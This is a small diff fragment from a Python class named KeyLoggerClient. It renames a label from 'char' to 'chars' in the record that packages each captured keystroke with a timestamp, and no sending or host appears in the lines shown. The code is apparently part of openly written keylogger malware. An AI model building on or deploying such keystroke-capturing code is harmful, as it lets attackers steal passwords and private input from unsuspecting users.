@@ -73,7 +73,7 @@ class KeyLoggerClient:
 			if self.keys is not None:
 				date_time = get_time()
 				key = str(self.keys).replace("'", "")
-				data = ["char", date_time, key]
+				data = ["chars", date_time, key]
 				self.keys = None
 				data = str(data)
 
